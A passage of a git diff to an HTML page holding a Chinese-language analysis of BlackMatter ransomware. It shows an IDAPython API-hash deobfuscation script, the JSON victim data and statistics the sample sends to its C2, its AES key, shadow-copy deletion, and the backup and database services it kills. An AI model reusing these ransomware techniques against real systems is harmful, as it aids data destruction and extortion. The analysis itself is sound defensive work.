+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C50C676F:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC50C676F&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;820A18A3:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X820A18A3&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FD1A17C6:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XFD1A17C6&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;41E8A017:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X41E8A017&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;3CFC1737:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X3CFC1737&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;C3BC5607:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0XC3BC5607&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;76E87915:&#39;</span><span class="o">+</span><span class="nb">dict</span><span class="p">[</span><span class="s1">&#39;0X76E87915&#39;</span><span class="p">])</span>
+</span></span></code></pre></div><p>最终计算结果如下：</p>
 <pre tabindex="0"><code>411677B7:ntdll.dll
 B1FC7F66:kernel32.dll
 BCFA1667:advapi32.dll
@@ -1112,47 +1756,47 @@ C3BC5607:activeds.dll
 <img src="/blackmatter_images/4401659177428.png" alt=""></p>
 <h3 id="23-idapython解密">2.3. IDAPython解密</h3>
 <p>根据上面的结论，可以进行简单的逻辑实现：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 传入Resolve_API_Hash函数的的地址</span>
-<span class="k">def</span> <span class="nf">Resolve_All_APIs</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">):</span>
-    <span class="c1"># 获取dll加载函数的交叉引用地址</span>
-    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">CodeRefsTo</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
-        <span class="n">current_ea</span> <span class="o">=</span> <span class="n">ref</span>
-        <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="mi">0</span>
-        <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="mi">0</span>
-
-        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-            <span class="c1"># 获取上一条汇编语言的地址</span>
-            <span class="n">prev_instruction_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">current_ea</span><span class="p">)</span>
-            <span class="c1"># 判断助记符是否为push</span>
-            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;push&#39;</span><span class="p">:</span>
-                <span class="k">if</span> <span class="n">api_addr_ea</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-                    <span class="c1"># 向上第一条push是api写入地址</span>
-                    <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-                <span class="k">else</span><span class="p">:</span>
-                    <span class="c1"># 再向上一条push是apihash存储的地址</span>
-                    <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-                    <span class="k">break</span>
-            <span class="n">current_ea</span> <span class="o">=</span> <span class="n">prev_instruction_ea</span>
-
-        <span class="n">api_addr_ea</span> <span class="o">+=</span> <span class="mi">4</span>
-        <span class="n">api_hashes_ea</span> <span class="o">+=</span> <span class="mi">4</span>
-
-        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
-        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-            <span class="c1"># 根据地址获取hash</span>
-            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_wide_dword</span><span class="p">(</span><span class="n">api_hashes_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">api_hash</span> <span class="o">==</span> <span class="mh">0xCCCCCCCC</span><span class="p">:</span>
-                <span class="k">break</span>
-            <span class="c1"># 进行异或解密</span>
-            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">api_hash</span> <span class="o">^</span> <span class="mh">0x22065FED</span>
-            <span class="k">if</span> <span class="n">api_hash</span> <span class="ow">in</span> <span class="n">export_hashes</span><span class="p">:</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">])</span>
-                <span class="c1"># 写入地址对应的api函数名</span>
-                <span class="n">idc</span><span class="o">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">api_addr_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">,</span> <span class="s1">&#39;mw_&#39;</span> <span class="o">+</span> <span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">],</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">SN_CHECK</span><span class="p">)</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">api_addr_ea</span><span class="p">),</span><span class="s1">&#39;NOTFOUND&#39;</span><span class="p">)</span>
-            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
-</code></pre></div><h2 id="3-bypassuac">3. BypassUAC</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 传入Resolve_API_Hash函数的的地址</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Resolve_All_APIs</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取dll加载函数的交叉引用地址</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ref</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">CodeRefsTo</span><span class="p">(</span><span class="n">resolve_ea</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_ea</span> <span class="o">=</span> <span class="n">ref</span>
+</span></span><span class="line"><span class="cl">        <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 获取上一条汇编语言的地址</span>
+</span></span><span class="line"><span class="cl">            <span class="n">prev_instruction_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">current_ea</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 判断助记符是否为push</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;push&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">api_addr_ea</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1"># 向上第一条push是api写入地址</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">api_addr_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1"># 再向上一条push是apihash存储的地址</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">api_hashes_ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">prev_instruction_ea</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_ea</span> <span class="o">=</span> <span class="n">prev_instruction_ea</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">api_addr_ea</span> <span class="o">+=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">        <span class="n">api_hashes_ea</span> <span class="o">+=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 根据地址获取hash</span>
+</span></span><span class="line"><span class="cl">            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_wide_dword</span><span class="p">(</span><span class="n">api_hashes_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">api_hash</span> <span class="o">==</span> <span class="mh">0xCCCCCCCC</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 进行异或解密</span>
+</span></span><span class="line"><span class="cl">            <span class="n">api_hash</span> <span class="o">=</span> <span class="n">api_hash</span> <span class="o">^</span> <span class="mh">0x22065FED</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">api_hash</span> <span class="ow">in</span> <span class="n">export_hashes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 写入地址对应的api函数名</span>
+</span></span><span class="line"><span class="cl">                <span class="n">idc</span><span class="o">.</span><span class="n">set_name</span><span class="p">(</span><span class="n">api_addr_ea</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">index</span><span class="p">,</span> <span class="s1">&#39;mw_&#39;</span> <span class="o">+</span> <span class="n">export_hashes</span><span class="p">[</span><span class="n">api_hash</span><span class="p">],</span> <span class="n">idaapi</span><span class="o">.</span><span class="n">SN_CHECK</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">api_addr_ea</span><span class="p">),</span><span class="s1">&#39;NOTFOUND&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span></code></pre></div><h2 id="3-bypassuac">3. BypassUAC</h2>
 <p>当成功加载<code>dll</code>后，开始检查当前用户的<code>RID</code>是否是<code>administrators</code>:</p>
 <p><img src="/blackmatter_images/944715141047.png" alt=""></p>
 <p>接着通过对比<code>OSMajorVersion</code>与<code>OSMinorVersion</code>检查操作系统版本：</p>
@@ -1249,68 +1893,68 @@ winsows vista 之后的操作系统：bootcfg /raw /fastdetect /id 1
 <h4 id="652-网络请求">6.5.2. 网络请求</h4>
 <p>如果配置文件中的<code>Post_Flag</code>为真，则会收集数据并发送到<code>C2</code>服务器。</p>
 <p>在加密前会进行一次基本信息的收集，数据结构的<code>json</code>格式如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-   <span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-   <span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
-      <span class="p">{</span>						<span class="c1">//当存在多个磁盘，该字典将变多
-</span><span class="c1"></span>         <span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-         <span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
-         <span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
-      <span class="p">}</span>
-   <span class="p">]</span>
-<span class="p">}</span>
-</code></pre></div><p>以下是我在虚拟机中获取的加密前发送数据：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;WIN-B1ESUN1R9U8&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;alee&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;Windows 7 Ultimate&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;WORKGROUP&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;x64&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;zh-CN&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
-		<span class="p">{</span>
-			<span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;C&#34;</span><span class="p">,</span>
-			<span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;102397&#34;</span><span class="p">,</span>
-			<span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;70005&#34;</span>
-		<span class="p">}</span>
-	<span class="p">]</span>
-<span class="p">}</span>
-</code></pre></div><p>当加密完成以后，还会进行一次结果统计，数据结构的<code>json</code>格式如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
-<span class="p">}</span>
-</code></pre></div><p>以下是我在虚拟机中获取的加密后发送数据</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;16499&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;3&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;1282&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;829&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633799826&#34;</span><span class="p">,</span>
-	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633800656&#34;</span>
-<span class="p">}</span>
-</code></pre></div><p>获取到数据后，会通过<code>AES</code>加密，再通过<code>base64</code>编码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>						<span class="c1">//当存在多个磁盘，该字典将变多
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">   <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>以下是我在虚拟机中获取的加密前发送数据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_hostname&#34;</span><span class="p">:</span><span class="s2">&#34;WIN-B1ESUN1R9U8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_user&#34;</span><span class="p">:</span><span class="s2">&#34;alee&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_os&#34;</span><span class="p">:</span><span class="s2">&#34;Windows 7 Ultimate&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_domain&#34;</span><span class="p">:</span><span class="s2">&#34;WORKGROUP&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_arch&#34;</span><span class="p">:</span><span class="s2">&#34;x64&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;host_lang&#34;</span><span class="p">:</span><span class="s2">&#34;zh-CN&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;disks_info&#34;</span><span class="p">:[</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nt">&#34;disk_name&#34;</span><span class="p">:</span><span class="s2">&#34;C&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nt">&#34;disk_size&#34;</span><span class="p">:</span><span class="s2">&#34;102397&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nt">&#34;free_size&#34;</span><span class="p">:</span><span class="s2">&#34;70005&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>当加密完成以后，还会进行一次结果统计，数据结构的<code>json</code>格式如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;%.8x%.8x%.8x%.8x%&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;%s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;%u&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>以下是我在虚拟机中获取的加密后发送数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_version&#34;</span><span class="p">:</span><span class="s2">&#34;1.2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_id&#34;</span><span class="p">:</span><span class="s2">&#34;26a3ebea3de1f2c535eb81c5456fc830&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;bot_company&#34;</span><span class="p">:</span><span class="s2">&#34;512478c08dada2af19e49808fbda5b0b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_all_files&#34;</span><span class="p">:</span><span class="s2">&#34;16499&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_not_encrypted&#34;</span><span class="p">:</span><span class="s2">&#34;3&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stat_size&#34;</span><span class="p">:</span><span class="s2">&#34;1282&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;execution_time&#34;</span><span class="p">:</span><span class="s2">&#34;829&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;start_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633799826&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="nt">&#34;stop_time&#34;</span><span class="p">:</span><span class="s2">&#34;1633800656&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>获取到数据后，会通过<code>AES</code>加密，再通过<code>base64</code>编码：</p>
 <p><img src="/blackmatter_images/4454242190921.png" alt=""></p>
 <p><code>AES</code>加密的密钥为：<code>A6F330B09CD47B4FB9214F7836AA46AD</code></p>
 <p><img src="/blackmatter_images/2348558197308.png" alt=""></p>
@@ -1327,11 +1971,11 @@ winsows vista 之后的操作系统：bootcfg /raw /fastdetect /id 1
 <p>调用<code>IEnumWbemClassObject::Next</code>枚举系统上的所有卷影副本，调用<code>IEnumWbemClassObject::Get</code>获取每个卷影副本的 ID，并调用<code>IWbemServices::DeleteInstance</code>删除它们。</p>
 <h4 id="655-终止服务">6.5.5. 终止服务</h4>
 <p>当<code>Kill_Service_Flag</code>为<code>True</code>时，使用<code>OpenSCManagerW</code>获取服务控制管理器句柄，然后使用<code>EnumServicesStatusExW</code>枚举所有服务，对比是否在终止名单中，如果是，则使用<code>ControlService</code>发送控制代码，使用<code>DeleteService</code>删除服务，服务列表如下：</p>
-<pre tabindex="0"><code>&quot;mepocs&quot;、&quot;memtas&quot;、&quot;veeam&quot;、&quot;svc$&quot;、&quot;backup&quot;、&quot;sql&quot;、&quot;vss&quot;
+<pre tabindex="0"><code>&#34;mepocs&#34;、&#34;memtas&#34;、&#34;veeam&#34;、&#34;svc$&#34;、&#34;backup&#34;、&#34;sql&#34;、&#34;vss&#34;
 </code></pre><p><img src="/blackmatter_images/3309612136445.png" alt=""></p>
 <h4 id="656-杀死进程">6.5.6. 杀死进程</h4>
 <p>当<code>Kill_Process_Flag</code>为<code>True</code>时，使用<code>NtQuerySystemInformation</code>检索进程列表，对比是否在杀死名单中，如果是，使用<code>NtOpenProcess</code>确认句柄，使用<code>NtTerminateProcess</code>杀死进程，进程列表如下：</p>
